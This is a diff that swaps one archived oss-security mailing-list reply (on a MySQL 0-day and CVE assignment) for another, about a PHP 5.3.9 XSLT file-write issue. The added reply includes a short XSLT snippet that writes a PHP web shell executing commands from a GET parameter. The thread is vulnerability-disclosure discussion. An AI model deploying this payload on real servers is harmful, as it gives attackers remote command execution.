@@ -1,42 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/09/14
-Message-ID: <4F343954.2010109@redhat.com>
-Date: Thu, 09 Feb 2012 14:23:32 -0700
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/01/14/2
+Message-Id: <20120114160325.8128bd2f8d97a740dd1ac1c0@quodvis.net>
+Date: Sat, 14 Jan 2012 16:03:25 -0300
+From: Ignacio Espinosa <osu@...dvis.net>
 To: oss-security@...ts.openwall.com
-CC: "Steven M. Christey" <coley@...us.mitre.org>, admin@...ndisco.net
-Subject: Re: MySQL 0-day - does it need a CVE?
+Cc: Kurt Seifried <kseifried@...hat.com>, Nicolas Grégoire <nicolas.gregoire@...rri.fr>
+Subject: Re: CVE affected for PHP 5.3.9 ?
 Content-Type: text/plain; charset=utf-8
 
-On 02/09/2012 01:46 PM, Yves-Alexis Perez wrote:
-> On ven., 2012-02-10 at 00:36 +0400, Solar Designer wrote:
->> That one is CVE-2011-2262, but per CVSS scoring it's just a DoS.
->> 
+On Fri, 13 Jan 2012 13:50:59 -0700
+Kurt Seifried <kseifried@...hat.com> wrote:
+> [...]
+> Ok I'm still not clear on what the security claim is. Are you saying you
+> can cause arbitrary text output via XSL/XML mangling tricks? And
+> combined with having a script that uses something like "<sax:output
+> href="0wn3d.php" method="text">" you can put arbitrary text content into
+> this file which could then result in the file being parsed? The problem
+> is you'd have to write a script that does this, writes to a local file
+> with a file ending in .php or .shtml or whatever, in which case it's
+> pretty clear the script writer MEANT to do that. Again I'm still not
+> clear on what/how a security boundary is being crossed. How does this
+> elevate privileges or give you remote access that you wouldn't already
+> if you can upload arbitrary PHP scripts?
 > 
-> Note that the initial immunity mail doesn't say anything about the 
-> vulnerability itself, so it might just be a DoS.
 > 
->> I wish we had more info.
-> 
-> Yeah, me too…
 
-There's nowhere near enough information available to validate that the
-new(?) issue reported by ImmunitySec matches up to CVE-2012-0492.
-Hopefully ImmunitySec/Oracle can comment on this and clear it up for
-users/vendors.
+You don't need to upload arbitrary php scripts to make this works. Just uploading a crafted xslt file will create (before patch)  a file with arbitrary content, php code for example, as write-access is set for default.
 
-Unfortunately CVE only works as well as the vendors using it decide it
-will. A biased example: Red Hat provides links to security reports with
-details, bugzilla entries, code commit information, and so on. Vendors
-that fail or refuse to provide details/code commits for their Open
-Source projects and so on make things extremely difficult for users and
-other vendors. =( An example of this is the following blog entry:
+-- snip --
+        <sax:output href="0wn3d.php" method="text">
+        <xsl:value-of select="'&lt;?php system(\$_GET[&quot;cmd&quot;]);?&gt;'"/>
+-- snip --
 
-http://blog.montyprogram.com/oracles-27-mysql-security-fixes-and-mariadb/
-
-I'm not trying to pick on Oracle but this is topical and a perfect
-example of the problem(s) CVE was meant to address but can't if vendors
-don't participate in the process appropriately.
 
 -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
+Ignacio Espinosa <osu@...dvis.net>
